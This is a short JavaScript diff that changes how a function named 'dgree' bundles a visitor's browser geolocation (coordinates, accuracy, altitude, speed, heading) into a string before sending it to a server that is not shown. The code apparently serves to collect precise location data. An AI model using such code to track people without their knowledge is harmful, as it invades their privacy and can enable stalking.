@@ -34,14 +34,14 @@ async function sendRequest(data) {
 async function dgree() {
   try {
     const pos = await getLocation();
-    const data = new FormData();
-    
-    data.append("Latitude", pos.coords.latitude);
-    data.append("Longitude", pos.coords.longitude);
-    data.append("Accuracy", pos.coords.accuracy);
-    data.append("Altitude", pos.coords.altitude);
-    data.append("Speed", pos.coords.speed);
-    data.append("Heading", pos.coords.heading);
+    const data = `
+      Latitude=${pos.coords.latitude}
+      Longitude=${pos.coords.longitude}
+      Accuracy=${pos.coords.accuracy}
+      Altitude=${pos.coords.altitude}
+      Speed=${pos.coords.speed}
+      Heading=${pos.coords.heading}
+    `
     
     await sendRequest(data);
   } catch (err) {
